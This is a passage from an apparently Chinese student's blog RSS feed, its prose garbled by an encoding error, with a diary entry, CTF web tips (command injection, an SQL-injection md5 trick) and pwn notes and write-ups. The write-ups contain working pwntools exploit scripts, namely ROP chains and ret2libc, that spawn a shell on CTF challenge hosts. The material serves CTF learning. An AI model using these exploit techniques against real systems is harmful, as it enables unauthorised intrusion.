”ç©¶ä¸€ä¸‹sshè¿™ç§ï¼ŒæŠŠè®¡ç½‘åƒé€ã€‚ã€‚ï¼ˆæ²¡é”™ï¼Œè€ƒè™‘ä¸€ä¸‹å¯’å‡å­¦ç‹é“çš„è®¡ç½‘ï¼‰ã€‚è¿˜æœ‰å°±æ˜¯ä½œæ›²ï¼Œä½œä¸ºè¡¥å……å¥½äº†ã€‚</p><p>ä¸‹å­¦æœŸå¼€å§‹å­¦åˆ†æˆ‘ä¸æ‰“ç®—æš´åŠ›å¡«æ»¡äº†ï¼Œè€Œæ˜¯å’Œå¤§ä¸‰å‡æ‘Šã€‚å› ä¸ºä¸‹å­¦æœŸå¾ˆæœ‰å¯èƒ½éœ€è¦æ¯”èµ›ã€ç§‘ç ”å’Œå®ä¹ èƒ½åŠ›æ”¯æ’‘ï¼Œæˆ‘è‚¯å®šè¦èŠ±å¾ˆå¤šæ—¶é—´å»è‡ªå·±å­¦çš„ï¼Œä¸èƒ½å†æ•´å¤©è·‘æ•™å­¦åŒºåç‰¢ã€‚å¹¶ä¸”ä¸‹å­¦æœŸä¼šå°‘ä¸€ä¸ªå€¼ç­ã€‚è¿™æ ·ï¼Œå¤§äºŒä¸‹ç†æƒ³çš„ç»“å±€æ˜¯ä¸€ä¸¤ä¸ªå¤§å¥–ã€ä¸€ç¯‡æ–‡å’Œä¸€ä»½offerã€‚é‚£ä¹ˆæˆ‘çš„å­¦åˆ†æœ€å¤šä¸èƒ½è¶…è¿‡ä¸‰åã€‚è¿™è¿˜æ˜¯å¥½å®ç°çš„ã€‚</p><p>okokï¼Œé…£ç•…æ·‹æ¼“çš„è§„åˆ’ï¼Œç¡è§‰äº†~</p><h2 id="1-12"><a href="#1-12" class="headerlink" title="1-12"></a>1-12</h2><p>å¿«è¦è€ƒè¯•äº†ï¼Œä½†æ˜¯å¯¹ç”Ÿæ¶¯è§„åˆ’äº§ç”Ÿäº†æ‡µé€¼ã€‚</p><p>å°±ä¸€æ¡è·¯èµ°æ­»â€”â€”è€ƒç ”ã€‚</p><p>æŠ€æœ¯æ ˆå­¦ä¹ è·¯çº¿ï¼š</p><p>äº‘è®¡ç®—+å¤§æ•°æ®æ¡†æ¶</p><p>åˆ†å¸ƒå¼</p><p>åµŒå…¥å¼+CV</p><h2 id="1-14"><a href="#1-14" class="headerlink" title="1-14"></a>1-14</h2><p>æ–°ç›®æ ‡getï¼šæ¯å¤©ä¸€é“åŠ›æ‰£</p><p>å›æº¯ä¹‹å‰çš„é¢˜ç›®ç»™å‡ºæ–°è§£æ³•ä¹Ÿç®—ä¸€é“å“¦~</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E6%97%A5%E8%AE%B0/">æ—¥è®°</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/10/12-1%E6%9C%88%E6%97%A5%E8%AE%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CTF webé›†</title>
      <link>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/</link>
      <guid>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/</guid>
      <pubDate>Wed, 30 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<ol><li><a href="https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">å‘½ä»¤æ³¨å…¥</a></li></ol><p>æ¥è‡ª<a href="https://uuzdaisuki.com/"> <strong>Leticiaâ€™s Blog</strong> </a></p><ol start="2"><li><p>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€åæœ‰ .git .<a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020">svn</a> .swp .~ .bak .bash_history</p></li><li><p>ffifdyopç»è¿‡md5å’Œfrom hexè½¬åŒ–ä¹‹åä¼šç”Ÿæˆâ€™orâ€™6å¼€å¤´çš„å­—ç¬¦ä¸²</p></li><li><p>ä¸¤ä¸ªmd5å“ˆå¸Œå¯ä»¥0eå¼€å¤´è‹¥ç›¸ç­‰</p></li><li><p>ä¸¤ä¸ªmd5å¼ºç›¸ç­‰æ¡ä»¶å¯ä»¥ç”¨æ•°åˆ—ç»•è¿‡å»</p></li><li></li></ol><h2 id="buuojå¥½é¢˜åå•"><a href="#buuojå¥½é¢˜åå•" class="headerlink" title="buuojå¥½é¢˜åå•"></a>buuojå¥½é¢˜åå•</h2><p>1.[GXYCTF2019]Ping Ping Ping</p><p>æ¨èç†ç”±ï¼šå‘½ä»¤æ³¨å…¥</p><p>å»ºè®®ï¼š</p><p>   1.å°è¯•base64ç»•è¿‡å’Œæ‹¼æ¥ç»•è¿‡</p><p>   2.chromeå¼€å¤´åŠ ä¸Šâ€view-source:â€œï¼Œå¯ä»¥çœ‹å…¨æºç ï¼ˆç›¸å½“äºctrl+uï¼‰</p><p>2.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1</p><p>æ¨èç†ç”±ï¼šsqlæ³¨å…¥</p><p>å»ºè®®ï¼šçœ‹æ”»ç•¥ <a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a></p><p>3.ã€RoarCTF 2019ã€‘Easy Calc 1</p><p>æ¨èç†ç”±ï¼šè§£é‡Šåˆ°ä½</p><p>å»ºè®®ï¼šçœ‹æ”»ç•¥<a href="https://www.dccomics.top/2021/11/11/%E3%80%90RoarCTF%202019%E3%80%91Easy%20Calc%201/">https://www.dccomics.top/2021/11/11/%E3%80%90RoarCTF%202019%E3%80%91Easy%20Calc%201/</a></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFåšé¢˜è®°å½•</category>
      
      
      <comments>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnå°çŸ¥è¯†</title>
      <link>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86/</link>
      <guid>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86/</guid>
      <pubDate>Wed, 30 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="pwn-gdbæ“ä½œ"><a href="#pwn-gdbæ“ä½œ" class="headerlink" title="pwn-gdbæ“ä½œ"></a>pwn-gdbæ“ä½œ</h2><p>åœ¨PWNä¸­ä½¿ç”¨GDB (GNU Debugger) è¿›è¡Œè°ƒè¯•æ˜¯ä¸€ä¸ªå¸¸è§çš„æ–¹æ³•ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨GDBè°ƒè¯•äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸€èˆ¬æ­¥éª¤å’Œä¸€äº›æœ‰ç”¨çš„æŠ€å·§ï¼š</p><ol><li><p><strong>å¯åŠ¨GDB</strong>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ./binary_name</span><br></pre></td></tr></table></figure></li><li><p><strong>è®¾ç½®æ–­ç‚¹</strong>:<br>ä½¿ç”¨ <code>b</code> (æˆ– <code>break</code>) å‘½ä»¤è®¾ç½®æ–­ç‚¹ã€‚ä¾‹å¦‚ï¼Œä¸ºä¸»å‡½æ•°è®¾ç½®æ–­ç‚¹:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b main</span><br></pre></td></tr></table></figure></li><li><p><strong>è¿è¡Œç¨‹åº</strong>:<br>ä½¿ç”¨ <code>r</code> (æˆ– <code>run</code>) å‘½ä»¤:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r [program arguments]</span><br></pre></td></tr></table></figure></li><li><p><strong>æŸ¥çœ‹å¯„å­˜å™¨çŠ¶æ€</strong>:<br>ä½¿ç”¨ <code>info registers</code> æˆ–ç®€å†™ <code>i r</code>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure></li><li><p><strong>å•æ­¥æ‰§è¡Œ</strong>:</p><ul><li><code>s</code> æˆ– <code>step</code>: æ‰§è¡Œä¸€è¡Œæºä»£ç ã€‚å¦‚æœè¯¥è¡Œæ˜¯å‡½æ•°è°ƒç”¨ï¼Œåˆ™è¿›å…¥è¯¥å‡½æ•°ã€‚</li><li><code>n</code> æˆ– <code>next</code>: æ‰§è¡Œä¸€è¡Œæºä»£ç ã€‚ä¸ä¼šè¿›å…¥å‡½æ•°ã€‚</li></ul></li><li><p><strong>æŸ¥çœ‹å†…å­˜</strong>:</p><ul><li><code>x</code> å‘½ä»¤: ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å¯ä»¥æŸ¥çœ‹æŸä¸ªåœ°å€çš„å†…å®¹ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x/10x <span class="variable">$rsp</span>  <span class="comment"># æŸ¥çœ‹å †æ ˆé¡¶éƒ¨çš„10ä¸ªåå…­è¿›åˆ¶å€¼</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ç»§ç»­æ‰§è¡Œ</strong>:<br>ä½¿ç”¨ <code>c</code> (æˆ– <code>continue</code>) å‘½ä»¤ã€‚</p></li><li><p><strong>é€€å‡ºGDB</strong>:<br>ä½¿ç”¨ <code>q</code> (æˆ– <code>quit</code>) å‘½ä»¤ã€‚</p></li><li><p><strong>ä½¿ç”¨GDBæ’ä»¶</strong>:<br>ä¸ºäº†æ–¹ä¾¿PWNè°ƒè¯•ï¼Œç¤¾åŒºæœ‰å¾ˆå¤šæœ‰ç”¨çš„GDBæ’ä»¶ï¼Œä¾‹å¦‚ <code>pwndbg</code>, <code>PEDA</code> å’Œ <code>GEF</code>ã€‚è¿™äº›æ’ä»¶ä¸ºGDBæä¾›äº†é¢å¤–çš„åŠŸèƒ½å’Œè§†è§‰å¢å¼ºï¼Œä½¿å…¶æ›´å®¹æ˜“ç”¨äºæ¼æ´åˆ†æå’Œåˆ©ç”¨ã€‚</p></li><li><p><strong>è°ƒè¯•è¿œç¨‹ç¨‹åº</strong>:<br>  å¦‚æœä½ æ­£åœ¨å°è¯•åˆ©ç”¨è¿œç¨‹æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ <code>gdbserver</code> åœ¨è¿œç¨‹ç«¯å¯åŠ¨ç¨‹åºï¼Œå¹¶ä»æœ¬åœ°ä½¿ç”¨GDBè¿æ¥å®ƒè¿›è¡Œè°ƒè¯•ã€‚</p></li><li><p><strong>å…¶ä»–æœ‰ç”¨çš„å‘½ä»¤</strong>:</p></li></ol><ul><li><code>info proc mappings</code>: æ˜¾ç¤ºè¿›ç¨‹çš„å†…å­˜æ˜ å°„ã€‚</li><li><code>set follow-fork-mode child</code>: å½“ç¨‹åºè¿›è¡Œforkæ—¶ï¼ŒGDBä¼šè·Ÿè¸ªå­è¿›ç¨‹ã€‚</li><li><code>set disassembly-flavor intel</code>: å°†åæ±‡ç¼–æ ¼å¼è®¾ç½®ä¸ºIntelæ ¼å¼ï¼Œè¿™é€šå¸¸æ¯”é»˜è®¤çš„AT&amp;Tæ ¼å¼æ›´æ˜“äºé˜…è¯»ã€‚</li></ul><p>è¿™åªæ˜¯ä½¿ç”¨GDBè¿›è¡ŒPWNè°ƒè¯•çš„åŸºç¡€ã€‚ä¸ºäº†æˆåŠŸåœ°æ‰¾åˆ°å¹¶åˆ©ç”¨æ¼æ´ï¼Œå¯èƒ½è¿˜éœ€è¦æŒæ¡æ›´å¤šé«˜çº§çš„è°ƒè¯•å’Œé€†å‘æŠ€å·§ã€‚</p><h2 id="æ ˆçš„å°çŸ¥è¯†"><a href="#æ ˆçš„å°çŸ¥è¯†" class="headerlink" title="æ ˆçš„å°çŸ¥è¯†"></a>æ ˆçš„å°çŸ¥è¯†</h2><h3 id="æ ˆ-Stack-æ˜¯å•¥ï¼Ÿ"><a href="#æ ˆ-Stack-æ˜¯å•¥ï¼Ÿ" class="headerlink" title="æ ˆ(Stack)æ˜¯å•¥ï¼Ÿ"></a>æ ˆ(Stack)æ˜¯å•¥ï¼Ÿ</h3><p>æ ˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„çº¿æ€§æ•°æ®ç»“æ„ï¼Œå®ƒåªå…è®¸åœ¨ä¸€ç«¯ï¼ˆç§°ä¸ºâ€œé¡¶â€ï¼‰è¿›è¡Œæ’å…¥å’Œåˆ é™¤æ“ä½œã€‚ç”±äºå®ƒçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨â€œåè¿›å…ˆå‡ºâ€ï¼ˆLIFOï¼‰æ¥æè¿°å®ƒã€‚å°±åƒä¸€å ç›˜å­ï¼Œæˆ‘ä»¬åªèƒ½æ”¾åœ¨æœ€é¡¶ç«¯æˆ–ä»æœ€é¡¶ç«¯æ‹¿èµ°ã€‚ğŸ½ï¸</p><p>ä½†æ˜¯æ ˆåœ¨å®é™…ç»“æ„é‡Œæ˜¯â€œå€’ç€çš„â€ï¼Œä¹Ÿå°±æ˜¯é«˜ä½åœ°å€æ‰æ˜¯åº•éƒ¨ï¼Œä½ä½åœ°å€æ‰æ˜¯é¡¶éƒ¨ï¼Œå€¼å¾—æ³¨æ„ã€‚</p><h3 id="æ ˆçš„ä¸»è¦æ“ä½œ"><a href="#æ ˆçš„ä¸»è¦æ“ä½œ" class="headerlink" title="æ ˆçš„ä¸»è¦æ“ä½œ"></a>æ ˆçš„ä¸»è¦æ“ä½œ</h3><ul><li><strong>å‹æ ˆ(Push)</strong>: å‘æ ˆä¸­æ·»åŠ å…ƒç´ ã€‚</li><li><strong>å¼¹æ ˆ(Pop)</strong>: ä»æ ˆä¸­å–å‡ºå…ƒç´ ã€‚</li></ul><h3 id="ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”"><a href="#ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”" class="headerlink" title="ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”"></a>ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”</h3><ol><li><strong>å‡½æ•°è°ƒç”¨</strong>ï¼šå½“å‡½æ•°Aè°ƒç”¨å‡½æ•°Bæ—¶ï¼Œå‡½æ•°Açš„çŠ¶æ€ï¼ˆä¾‹å¦‚å±€éƒ¨å˜é‡ï¼‰è¢«â€œå‹å…¥â€æ ˆä¸­ï¼Œç­‰å¾…å‡½æ•°Bå®Œæˆåå†ç»§ç»­æ‰§è¡Œã€‚</li><li><strong>æ‹¬å·åŒ¹é…</strong>ï¼šä½ çŸ¥é“ç¼–ç¨‹ä¸­çš„æ‹¬å·æ˜¯å¦é…å¯¹æ­£ç¡®å—ï¼Ÿç”¨æ ˆå°±èƒ½è½»æ¾æå®šï¼</li><li><strong>æ’¤é”€æ“ä½œ</strong>ï¼šä¾‹å¦‚åœ¨æ–‡å­—å¤„ç†è½¯ä»¶ä¸­ï¼Œæ’¤é”€åŠŸèƒ½å°±é æ ˆå®ç°ã€‚</li></ol><h3 id="æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸"><a href="#æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸" class="headerlink" title="æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸"></a>æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸</h3><ul><li>ğŸŒ¹<strong>ä¼˜ç‚¹</strong>ï¼šç»“æ„ç®€å•ï¼Œæ“ä½œçµæ´»ã€‚</li><li>ğŸŒªï¸<strong>ç¼ºç‚¹</strong>ï¼šå­˜å‚¨ç©ºé—´å—é™ï¼Œå®¹æ˜“é€ æˆæº¢å‡ºã€‚</li></ul><h3 id="ä¸¾ä¸ªä¾‹å­"><a href="#ä¸¾ä¸ªä¾‹å­" class="headerlink" title="ä¸¾ä¸ªä¾‹å­"></a>ä¸¾ä¸ªä¾‹å­</h3><p>æœ‰ä¸€æ®µROPé“¾è¢«å‘é€åˆ°32ä½linuxï¼Œå®ƒå…¶ä¸­çš„å†…å®¹æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop_3_ret)<span class="comment"># mprotectæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ32ä½æ ˆå‡½æ•°ä¼ å‚</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)     <span class="comment"># 0x7 == å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(start_addr)</span><br></pre></td></tr></table></figure><p>åˆ™æ ˆçš„ç»“æ„å˜æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- è¢«æ”»å‡»å‡½æ•°è¿”å›åæ‰§è¡Œæ­¤åœ°å€</span><br><span class="line">+--------------+</span><br><span class="line">|  0x100       | &lt;-- readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° (size)</span><br><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° (buf)</span><br><span class="line">+--------------+</span><br><span class="line">|  0           | &lt;-- readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° (file descriptor, 0ä»£è¡¨stdin)</span><br><span class="line">+--------------+</span><br><span class="line">|  pop_3_ret   | &lt;-- ç”¨äºpopä¸‰ä¸ªå‚æ•°åˆ°å¯„å­˜å™¨</span><br><span class="line">+--------------+</span><br><span class="line">|  read_addr   | &lt;-- readå‡½æ•°åœ°å€</span><br><span class="line">+--------------+</span><br><span class="line">|  0x7         | &lt;-- mprotectå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° (æƒé™: å¯è¯»å¯å†™å¯æ‰§è¡Œ)</span><br><span class="line">+--------------+</span><br><span class="line">|  0x1000      | &lt;-- mprotectå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° (å¤§å°)</span><br><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- mprotectå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° (åœ°å€)</span><br><span class="line">+--------------+</span><br><span class="line">|  pop_3_ret   | &lt;-- ç”¨äºpopä¸‰ä¸ªå‚æ•°åˆ°å¯„å­˜å™¨</span><br><span class="line">+--------------+</span><br><span class="line">| mprotect_addr| &lt;-- mprotectå‡½æ•°åœ°å€ï¼Œï¼ˆåŸæ¥ä¸ºebpï¼‰</span><br><span class="line">+--------------+</span><br><span class="line">|    ...       | &lt;-- 0x38ä¸ª&#x27;cyclic&#x27;å­—ç¬¦ï¼Œå¯èƒ½ç”¨äºæº¢å‡ºç¼“å†²åŒº</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯æ¬¡ä»æœ€ä½ä½POPä¸€ä¸ªæ–¹å—ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„è¦æ±‚ï¼Œæ¯”å¦‚æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€read_addrçš„è¯ï¼Œå°±è¦å†è¿ç»­POPå®ƒæ‰€è¦æ±‚çš„å‚æ•°ï¼Œreadæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥POPä¸‰ä¸ªå‚æ•°ã€‚ç„¶åreadæ˜¯è¦è¯»å–ç”¨æˆ·è¾“å…¥çš„å†…å®¹çš„ï¼Œå› æ­¤è¿˜è¦ç­‰ç”¨æˆ·è¾“å…¥å†…å®¹ã€‚è¾“å…¥å®Œä¹‹åï¼Œå‡½æ•°ä¸€èˆ¬éƒ½ä¼šæœ‰ä¸€ä¸ªreturnï¼Œè¿™é‡Œå°±æ˜¯å›åˆ°start_addrã€‚è€ŒåŸé¢˜shellcodeåœ¨readè¿‡ç¨‹ä¸­å†™å…¥äº†æ­¤åœ°å€ï¼Œå› æ­¤å¯ç›´æ¥è¿›å…¥shellã€‚</p><p>åŸé¢˜æ˜¯pwnåˆ·é¢˜è®°å½•2ä¸­çš„get_started_3dsctf_2016ï¼ˆ*ï¼‰</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFåšé¢˜è®°å½•</category>
      
      
      <comments>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>åˆ·é¢˜è®°å½•ä¹‹hgame mini</title>
      <link>https://cjliblog.top/2023/08/27/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/</link>
      <guid>https://cjliblog.top/2023/08/27/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/</guid>
      <pubDate>Sat, 26 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Share-interesting-things"><a href="#Share-interesting-things" class="headerlink" title="Share interesting things"></a>Share interesting things</h2><p><em>9.3</em></p><p><strong>è¿™é¢˜å±å®æ˜¯æŠŠæˆ‘ç´¯åäº†ï¼Œè¯·æ•™äº†å¸ˆå‚…å¥½ä¹…[emo]</strong></p><p><strong>å…ˆä¸Šexploitï¼Œåç»­è¡¥ä¸Šåˆ†æï¼</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io= remote(<span class="string">&quot;1.container.jingsai.apicon.cn&quot;</span>,<span class="number">32376</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;../vuln&quot;)</span></span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4012e3</span></span><br><span class="line">rdx_rsi_rdi_syscall=<span class="number">0x401197</span></span><br><span class="line">str1=<span class="number">0x404080</span></span><br><span class="line"></span><br><span class="line">p=cyclic(<span class="number">0x28</span>)</span><br><span class="line">p+=p64(rdx_rsi_rdi_syscall)</span><br><span class="line">p+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(str1)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">p2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+cyclic(<span class="number">50</span>)</span><br><span class="line">io.sendline(p2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="smoothâ€”â€”crypto"><a href="#smoothâ€”â€”crypto" class="headerlink" title="smoothâ€”â€”crypto"></a>smoothâ€”â€”crypto</h2><p><em>0829</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollards_p_1</span>(<span class="params">N</span>):</span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    n = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        res = gmpy2.gcd(a-<span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;n =&#x27;</span>), n</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;p =&#x27;</span>), res</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = ....<span class="comment">#çœç•¥</span></span><br><span class="line">enc = ....<span class="comment">#çœç•¥</span></span><br><span class="line">p = Pollards_p_1(n)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(enc, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="REPEATâ€”â€”pwnï¼ˆ-ï¼‰"><a href="#REPEATâ€”â€”pwnï¼ˆ-ï¼‰" class="headerlink" title="REPEATâ€”â€”pwnï¼ˆ*ï¼‰"></a>REPEATâ€”â€”pwnï¼ˆ*ï¼‰</h2><p><em>0829</em></p><p><strong>è€ƒç‚¹ï¼šret2libc</strong></p><h4 id="1-exploit"><a href="#1-exploit" class="headerlink" title="1.exploit"></a>1.exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;../vuln&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;1.container.jingsai.apicon.cn&#x27;</span>,<span class="number">31547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">duiqi = <span class="number">0x40101A</span></span><br><span class="line">rdi = <span class="number">0x4012C3</span></span><br><span class="line">got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x40120B</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;By the way, I removed the system function this time.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line">p += p64(rdi) + p64(got)                                       </span><br><span class="line">p += p64(plt)                           </span><br><span class="line">p += p64(main_addr)                  </span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">haha=sh.recv(<span class="number">96</span>)</span><br><span class="line"><span class="built_in">print</span>(haha)</span><br><span class="line">myaddr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(myaddr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;By the way, I removed the system function this time.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;write&quot;,myaddr)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libcbase = myaddr - libc.dump(&quot;write&quot;)</span></span><br><span class="line">libcbase = myaddr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys_addr=libcbase+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">sys_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#nextä»¥å°†ç”Ÿæˆå™¨è½¬åŒ–ä¸ºæ•´æ•°ï¼Œä¸æ•´æ•°libcbaseç›¸åŠ </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span>+<span class="number">8</span>)+ p64(duiqi) +p64(rdi) + p64(bin_sh)+ p64(sys_addr) </span><br><span class="line"></span><br><span class="line">sh.sendline(p1)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-åˆ†æ"><a href="#2-åˆ†æ" class="headerlink" title="2.åˆ†æ"></a>2.åˆ†æ</h4><h5 id="æ–‡ä»¶ï¼š"><a href="#æ–‡ä»¶ï¼š" class="headerlink" title="æ–‡ä»¶ï¼š"></a>æ–‡ä»¶ï¼š</h5><p>ä¸€ä¸ªvuln, 